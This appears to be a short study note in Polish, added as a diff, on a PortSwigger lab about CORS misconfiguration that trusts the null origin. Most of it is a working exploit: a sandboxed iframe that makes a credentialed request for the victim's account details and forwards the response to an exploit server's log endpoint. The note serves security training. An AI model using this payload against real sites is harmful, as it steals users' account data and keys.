@@ -1,0 +1,14 @@
+(https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
+
+Przyklad gdzie mechanizm cors dopuszcza wartosc NULL, tak mozemy wykonac zapytanie.
+
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','$url/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+        location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText);
+    };
+</script>"></iframe>
